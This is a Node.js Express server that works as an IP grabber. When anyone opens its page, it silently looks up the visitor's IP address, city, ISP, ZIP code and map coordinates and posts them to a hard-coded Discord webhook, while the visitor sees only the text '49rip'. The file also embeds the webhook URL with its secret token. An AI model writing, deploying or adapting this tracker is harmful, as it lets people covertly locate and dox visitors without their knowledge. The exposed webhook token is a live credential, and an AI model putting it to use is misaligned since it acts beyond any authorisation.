const express = require('express');
const app = express();
const axios = require('axios');
const PORT = process.env.PORT || 3000; 

app.set('trust proxy', true); 
app.get('/', async (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const ipInfo = await getIPInfo(ip);
  send(ipInfo);
  res.send('49rip');
});
 
const webhookUrl = 'https://discord.com/api/webhooks/1159170951217422459/BDbsM_GEvj7ZOEsCeCcrSjQL9LsE11QUGIXC0lXOk9qOsEr2sGAu224uxz3kWe7lAtZh';

async function getIPInfo(ip) {
  try {
    const response = await axios.get(`http://ip-api.com/json/${ip}`);
    return response.data;
  } catch (error) {
    console.error('IP bilgisini alma sırasında hata:', error);
    return {};
  }
}

function send(ipInfo) {
  const countryCode = ipInfo.countryCode.toLowerCase();
  const flag = `flag_${countryCode}`;

  const content = `
    > # IP INFO
   * :globe_with_meridians: IP : ${ipInfo.query}
   * :house: Location: ${ipInfo.country}, ${ipInfo.city}
   * :wrench: ISP: ${ipInfo.isp}
   * :tools: AS: ${ipInfo.as}
   * :chains: ORG: ${ipInfo.org}
   * :alarm_clock: TimeZone: ${ipInfo.timezone}
   * :earth_americas: Region: ${ipInfo.regionName}
   * :earth_americas: RegionN: ${ipInfo.region}
   * :envelope: Zip: ${ipInfo.zip}
   * :map: Cordinations: ${ipInfo.lat}, ${ipInfo.lon}
   * :${flag}: Country: ${ipInfo.country}
   * :map: [Google Maps / Adress](https://www.google.com/maps?q=${ipInfo.lat},${ipInfo.lon})
  `;;

  axios.post(webhookUrl, {
    content: content
  })
  .catch(error => {
    console.error('webhook error', error);
  });
}

app.listen(PORT, () => {
  console.log(`${PORT} opened`);
});
